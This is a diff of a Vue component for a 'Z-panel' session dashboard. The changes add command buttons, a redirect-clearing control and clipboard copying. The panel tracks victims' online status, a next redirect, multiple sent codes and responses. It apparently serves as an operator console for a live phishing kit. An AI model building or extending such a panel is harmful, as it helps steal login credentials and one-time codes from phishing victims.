@@ -1,4 +1,4 @@
-<script>
+<script lang="ts">
 import navscrollto from '@/components/app/NavScrollTo.vue';
 import { ScrollSpy } from 'bootstrap';
 import { useSessionStore } from '@/stores/sessionStore';
@@ -6,9 +6,10 @@ import { useAppVariableStore } from '@/stores/app-variable';
 import { useAppOptionStore } from '@/stores/app-option';
 import { onMounted, ref } from "vue";
 import { Modal } from "bootstrap";
+import { RouterLink } from 'vue-router';
 import jsVectorMap from 'jsvectormap';
-import 'jsvectormap/dist/maps/world.js';
-import 'jsvectormap/dist/css/jsvectormap.min.css';
+import 'jsvectormap/dist/jsvectormap.js';
+import 'jsvectormap/dist/jsvectormap.min.css';
 
 const appVariable = useAppVariableStore();
 const sessionStore = useSessionStore();
@@ -26,6 +27,7 @@ export default {
 			activeModalToken: null,
 			sendDataModal: null,
 			sendError: false,
+			cmdError: "",
 			modalShowSendWithError: false,
 
 			fields: {},
@@ -118,10 +120,10 @@ export default {
 		statusColor: function () {
 			if (sessionStore.currentSession) {
 				try {
-					let ts = parseInt(sessionStore.currentSession.Last_Online);
+					let ts = sessionStore.currentSession.Last_Online
 					let d = new Date(ts * 1000);
 					let now = new Date();
-					let seconds = parseInt(Math.abs(now.getTime() - d.getTime()) / 1000);
+					let seconds = Math.abs(now.getTime() - d.getTime()) / 1000;
 					if (seconds <= 5) {
 						return "color:lightgreen"
 					}
@@ -137,8 +139,6 @@ export default {
 				return "..."
 			}
 			let field = sessionStore.currentSession.MainField;
-			console.log(sessionStore.selectedPanel);
-			//console.log("main field:",field);
 			if (!field) {
 				return "-"
 			}
@@ -159,19 +159,41 @@ export default {
 		closeModal: function () {
 			this.sendDataModal.hide();
 		},
-		onOptionClick: function (ev) {
+		clearRedirect: async function(){
+		    if(sessionStore.currentSession){
+		        sessionStore.updateRedirect("",false,false);
+		    }
+		},
+		onOptionClick: async function (ev) {
 			let btn = ev.currentTarget;
+			this.cmdError="";
 			if (btn.dataset && btn.dataset.token) {
 				let token = btn.dataset.token;
 				let selectedToken = sessionStore.currentSession.options.find(option => {
 					return option.tokenName === token;
 				})
 				if (selectedToken) {
+					if (selectedToken.tokenButtonType && selectedToken.tokenButtonType.includes("cmd")) {
+						let cmd=selectedToken.tokenName;
+						let result= await sessionStore.sessionCmd(cmd,false);
+						if(result){
+							if(result.status && result.status=="ok"){
+								this.cmdError = "Command executed"
+							}
+							else{
+								this.cmdError = result.message
+							}
+						}
+						else{
+							this.error = "error executing command"
+						}
+						return 
+					}
 					if (selectedToken.tokenButtonType && selectedToken.tokenButtonType.includes("pushdata")) {
 						this.activeModal = selectedToken.tokenButtonType;
 						this.activeModalName = selectedToken.tokenButtonName;
-						this.activeModalToken = selectedToken.tokenName;
-						this.modalShowSendWithError = (selectedToken.SendTokenWithError == "1" || selectedToken.SendTokenWithError == 1);
+						this.activeModalToken = selectedToken.pagefile ? selectedToken.pagefile : selectedToken.tokenName;
+						this.modalShowSendWithError = (selectedToken.SendTokenWithError == "1");
 						this.fields = {}
 						let fieldIds = selectedToken.tokenButtonType.replace("pushdata", "").split("-")
 						for (let field of fieldIds) {
@@ -185,9 +207,9 @@ export default {
 					    if(parts.length==3){
 							let input = parts[1]
 							let field = parts[2]
-							let isError = (selectedToken.SendTokenWithError == "1" || selectedToken.SendTokenWithError == 1);
+							let isError = (selectedToken.SendTokenWithError == "1");
 							if(isError){
-								field=1;
+								field="1";
 							}
 					        let value=this.comboInputs[input]
 							let fieldValues={}
@@ -204,17 +226,17 @@ export default {
 								}
 							}
 							fieldValues[field]=value
-							sessionStore.sendData(fieldValues, selectedToken.pagefile, isError)
+							sessionStore.sendData(fieldValues, selectedToken.pagefile, isError, false)
 							return;
 					    }
 					}
-					let sendError = (selectedToken.SendTokenWithError == "1" || selectedToken.SendTokenWithError == 1);
-					sessionStore.updateRedirect(selectedToken.pagefile, sendError);
+					let sendError = (selectedToken.SendTokenWithError == "1");
+					sessionStore.updateRedirect(selectedToken.pagefile, sendError,false);
 				}
 			}
 		},
 		sendData: function () {
-			sessionStore.sendData(this.fields, this.activeModalToken, this.sendError)
+			sessionStore.sendData(this.fields, this.activeModalToken, this.sendError,false)
 			this.sendDataModal.hide()
 		},
 		onlineStatus: function (str) {
@@ -222,7 +244,7 @@ export default {
 				let ts = parseInt(str);
 				let d = new Date(ts * 1000);
 				let now = new Date();
-				let seconds = parseInt(Math.abs(now.getTime() - d.getTime()) / 1000);
+				let seconds = Math.abs(now.getTime() - d.getTime()) / 1000;
 				if (seconds <= 5) {
 					return "Online"
 				}
@@ -243,11 +265,10 @@ export default {
 		},
 		isOnline: function(){
 			if(sessionStore.currentSession){
-				let str=sessionStore.currentSession.Last_Online;
-				let ts = parseInt(str);
+				let ts = sessionStore.currentSession.Last_Online;
 				let d = new Date(ts * 1000);
 				let now = new Date();
-				let seconds = parseInt(Math.abs(now.getTime() - d.getTime()) / 1000);
+				let seconds = Math.abs(now.getTime() - d.getTime()) / 1000;
 				if (seconds <= 5) {
 					return true;
 				}
@@ -265,6 +286,7 @@ export default {
 			}
 		},
 		loadSession: function ($sessionId) {
+			sessionStore.clearSession();
 			sessionStore.searchSession($sessionId)
 		},
 		getMarkerData() {
@@ -277,7 +299,7 @@ export default {
 			}
 			return results;
 		},
-		sessionProp: function (key, placeholder, notSetValue, formatter) {
+		sessionProp: function (key, placeholder, notSetValue=null, formatter=null) {
 			if (sessionStore.currentSession) {
 				let session = sessionStore.currentSession;
 				if (key in session) {
@@ -375,9 +397,6 @@ export default {
 		})
 		if (this.$route.params.id) {
 			this.loadSession(this.$route.params.id)
-			setTimeout(() => {
-				this.loadSession(this.$route.params.id)
-			}, 2000)
 		}
 		this.sendDataModal = new Modal(this.$refs.modalElement)
 		this.renderMap();
@@ -492,7 +511,7 @@ export default {
 <template>
 	<ul class="breadcrumb">
 		<li class="breadcrumb-item"><a href="#">Z-panel</a></li>
-		<li class="breadcrumb-item">Sessions</li>
+		<li class="breadcrumb-item"><RouterLink to="/logs">Sessions</RouterLink></li>
 		<li class="breadcrumb-item active">{{ sessionId }}</li>
 	</ul>
 
@@ -532,13 +551,14 @@ export default {
 						-->
 						<h5 class="card-title">Next Redirect:</h5>
 						<p>{{ sessionProp("Next_Redirect", "...","") }}
+						    <span v-if="session && session.Next_Redirect" @click="clearRedirect()"><i class="bi bi-trash"></i></span>
 							&nbsp;
 							{{ sessionProp("sentcode", "...", "_") }} {{ sessionProp("sentcode2", "...", "_") }}
 							{{ sessionProp("sentcode3", "...", "_") }} {{ sessionProp("sentcode4", "...", "_") }}
 							{{ sessionProp("sentcode5", "...", "_") }}
 						</p>
 						<h5 class="card-title">{{ mainFieldName }}:</h5>
-						<h1>{{ mainField }}<small><i class="bi bi-clipboard"></i></small></h1>
+						<h1 @click="copyClipboard(mainField)">{{ mainField }}<small><i class="bi bi-clipboard"></i></small></h1>
 						<h5 class="card-title">Responses:</h5>
 						<div v-if="session && session.responses" v-for="(item, index) in session.responses">
 							<div class="responseitem">
@@ -562,7 +582,7 @@ export default {
 			<div class="col">
 				<div class="card cardh h-100 mb-2">
 					<div class="card-body">
-						<button type="button" v-for="option in panelOptions" :class="btnStyle(option)"
+						<button type="button" style="width:max-content" v-for="option in panelOptions" :class="btnStyle(option)"
 							@click="onOptionClick" :data-token="option.tokenName">
 							{{ option.tokenButtonName }}
 						</button>
@@ -602,8 +622,8 @@ export default {
 					</div>
 				</div>
 			</div>
-			<h4>Main tokens:</h4><br>
-			<div class="col">
+			<h4 v-if="mainOptions && mainOptions.length > 0">Main tokens:</h4><br>
+			<div class="col" v-if="mainOptions && mainOptions.length > 0">
 				<div class="card cardh h-100 mb-2">
 					<div class="card-body">
 						<button type="button" v-for="option in mainOptions" :class="btnStyle(option)"
